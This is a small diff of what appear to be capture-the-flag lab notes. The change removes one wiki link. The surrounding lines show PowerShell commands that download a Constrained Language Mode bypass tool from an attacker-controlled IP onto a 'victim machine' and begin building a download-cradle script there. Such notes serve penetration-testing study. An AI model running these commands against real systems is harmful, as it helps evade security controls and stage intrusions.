@@ -13,7 +13,6 @@ Transfer a file with the following command:
 ```bash
 PS> iwr -uri http://10.10.14.4/PsBypassCLM.exe -OutFile PsBypassCLM.exe
 ```
-[[Sizzle#^]]
 Execute this commands to create wget.ps1 on victim machine:
 ```powershell
 echo $webclient = New-Object System.Net.WebClient >> wget.ps1
